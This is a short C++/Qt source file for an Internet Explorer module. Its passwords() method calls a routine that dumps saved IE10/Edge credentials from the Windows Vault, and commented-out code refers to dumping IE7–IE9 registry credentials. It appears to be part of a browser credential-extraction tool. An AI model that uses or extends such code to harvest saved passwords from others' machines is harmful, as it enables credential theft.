#include "ie.h"
#ifdef Q_OS_WIN
#include "ie_windows.h"
#endif

IE::IE()
{

}

QString IE::browserPath()
{
    return QString();
}

QStringList IE::tabs()
{
    //TODO:
    return QStringList();
}

QVariantList IE::passwords()
{
#ifdef Q_OS_WIN
    QVariantList passwords;
    //    log_info("Starting IE10 / MSEdge dump...\n");
    if(get_ie_vault_creds(passwords) == -1) {
        log_error("get_ie_vault_creds() failure");
    }

    //        log_info("Starting IE7-IE9 dump...\n");
    //    if(ie::get_ie_registry_creds() == -1) {
    //        log_error("get_ie7_ie9_creds() failure");
    //    }
    return passwords;
#else
    return QVariantList();
#endif
}
